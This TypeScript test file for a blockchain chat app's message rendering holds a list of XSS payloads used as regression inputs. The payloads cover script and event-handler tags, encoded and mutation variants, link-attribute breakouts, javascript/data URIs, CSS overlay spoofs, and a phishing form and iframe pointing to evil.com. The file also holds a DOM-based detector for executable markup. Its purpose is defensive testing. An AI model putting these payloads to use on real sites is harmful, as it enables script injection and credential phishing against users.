/**
 * Hostile inputs reused by every test that covers a rendering path.
 *
 * Chat messages are stored permanently on the blockchain, so any payload that survives a
 * rendering path is replayable against every recipient forever. Each entry documents a
 * concrete mistake that was possible in this codebase, so that a future refactor that
 * reintroduces it fails here instead of in production.
 */
export const XSS_PAYLOADS = {
  /** Plain markup: the baseline case */
  rawTag: '<img src=x onerror=alert(1)>',
  rawScript: '<script>alert(1)</script>',
  /**
   * Entity-encoded markup. Reading `textContent` back out of a parsed document decodes
   * entities, so a formatter that round-trips through the DOM turns this into a live tag.
   */
  entityEncodedTag: '&lt;img src=x onerror=alert(1)&gt;',
  entityEncodedScript: '&lt;script&gt;alert(1)&lt;/script&gt;',
  doubleEncodedTag: '&amp;lt;img src=x onerror=alert(1)&amp;gt;',
  /**
   * Quote breakout in a link target. With the URL interpolated into an inline `onClick`
   * attribute, the double quote closed the attribute and started a second, attacker-chosen
   * one.
   */
  linkAttributeBreakout: '[x](https://x.com"onmouseover="alert(1))',
  linkQuoteBreakout: "[x](https://x.com'); alert(1); ('",
  javascriptUri: '[x](javascript:alert(1))',
  javascriptUriObfuscated: '<a href="java\nscript:alert(1)">x</a>',
  dataUri: '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  /** A working credential form rendered inside a chat bubble */
  phishingForm: '<form action="https://evil.com"><input name="p"><button>Login</button></form>',
  /**
   * Utility classes shipped by Vuetify combine into an opaque overlay covering the app.
   * This is why `class` is not allowed on message content.
   */
  overlayByClass: '<span class="position-fixed w-100 h-100 bg-surface d-block">FAKE</span>',
  overlayByStyle:
    '<h1 style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:9999">FAKE</h1>',
  svgAnimate: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  mutationXss: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  iframe: '<iframe src="https://evil.com"></iframe>',
  styleTag: '<style>body{display:none}</style>',
  headingWithTag: '# <img src=x onerror=alert(1)>',
  headingWithEntities: '# &lt;img src=x onerror=alert(1)&gt;'
} as const

export const ALL_XSS_PAYLOADS = Object.values(XSS_PAYLOADS)

const EXECUTABLE_ELEMENTS = ['script', 'style', 'iframe', 'object', 'embed', 'form']
const UNSAFE_SCHEME = /^(javascript|data|vbscript):/i

/**
 * Removes the characters browsers ignore when they resolve a URL, so that a scheme cannot
 * be hidden behind them (`java\tscript:`, `java\nscript:`, leading spaces).
 */
function stripIgnoredUriChars(uri: string): string {
  return Array.from(uri)
    .filter((character) => character.charCodeAt(0) > 0x20)
    .join('')
}

/**
 * Returns a list of reasons why the given HTML is unsafe, empty when it is safe.
 *
 * The check parses the markup instead of searching for substrings: escaped text such as
 * `&lt;img onerror=…&gt;` contains the word `onerror` while being completely inert, and a
 * substring match cannot tell the two apart.
 */
export function findExecutableMarkup(html: string): string[] {
  const problems: string[] = []
  const parsed = new DOMParser().parseFromString(html, 'text/html')

  parsed.body.querySelectorAll('*').forEach((element) => {
    const tag = element.tagName.toLowerCase()

    if (EXECUTABLE_ELEMENTS.includes(tag)) {
      problems.push(`element <${tag}>`)
    }

    for (const attribute of Array.from(element.attributes)) {
      const name = attribute.name.toLowerCase()

      if (name.startsWith('on')) {
        problems.push(`event handler ${tag}[${name}]`)
      }

      if (
        (name === 'href' || name === 'src' || name === 'action' || name === 'formaction') &&
        UNSAFE_SCHEME.test(stripIgnoredUriChars(attribute.value))
      ) {
        problems.push(`unsafe URI in ${tag}[${name}]`)
      }
    }
  })

  return problems
}
